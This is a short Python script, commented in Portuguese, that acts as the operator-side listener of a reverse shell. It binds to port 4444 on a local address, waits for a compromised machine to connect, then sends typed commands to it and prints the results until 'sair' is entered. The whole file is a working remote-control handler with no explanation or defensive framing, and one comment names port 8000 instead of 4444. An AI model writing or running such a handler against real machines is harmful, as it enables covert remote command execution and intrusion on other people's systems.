import socket
import sys

sys.tracebacklimit = 0

def connection():
    #Caso não feche a porta 4444: lsof -i :8000
    s = socket.socket()
    s.bind(("192.168.0.17", 4444))
    s.listen(1)
    s_remoto, ip_remoto = s.accept()
    print(f"Conexão remota: {ip_remoto}")

    while True:
        comando = input("Shell> ")
        if('sair' in comando):
            s_remoto.send('sair'.encode())
            s_remoto.close()
            break
        else:
            s_remoto.send(comando.encode())
            print(f"{s_remoto.recv(1024).decode('utf8', 'ignore')}")

if __name__ == '__main__':
    connection()

